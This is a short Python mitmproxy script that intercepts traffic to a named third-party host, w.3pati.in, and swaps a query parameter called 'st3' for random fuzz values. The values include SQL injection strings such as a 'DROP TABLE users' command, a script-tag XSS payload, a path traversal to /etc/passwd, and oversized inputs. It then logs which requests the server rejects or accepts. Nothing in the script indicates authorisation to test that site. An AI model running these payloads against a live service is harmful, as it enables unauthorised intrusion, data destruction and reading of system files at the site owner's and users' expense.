# fuzz_test.py - Test with extreme values
from mitmproxy import http
import random

fuzz_values = [
    "999999999999999", "0", "-1", "-9999999", "1.5", "1e10",
    "' OR '1'='1", "'; DROP TABLE users; --",
    "<script>alert(1)</script>",
    "../../../etc/passwd",
    "!@#$%^&*()_+", "テスト",
    "A" * 5000, "🚀🔥💰"
]

def request(flow: http.HTTPFlow) -> None:
    if "w.3pati.in" in flow.request.pretty_host and "st3=" in flow.request.url:
        fuzz_value = random.choice(fuzz_values)
        original_st3 = flow.request.query.get("st3", "")
        flow.request.query["st3"] = fuzz_value
        print(f"[FUZZ] Changed st3 from {original_st3} to: {fuzz_value}")

def response(flow: http.HTTPFlow) -> None:
    if "w.3pati.in" in flow.request.pretty_host:
        status = flow.response.status_code
        if status >= 500:
            print(f"  🔴 SERVER ERROR! Status: {status}")
        elif status >= 400:
            print(f"  ⚠️ Request rejected. Status: {status}")
        elif status == 200:
            print(f"  ✅ Request accepted. Status: {status}")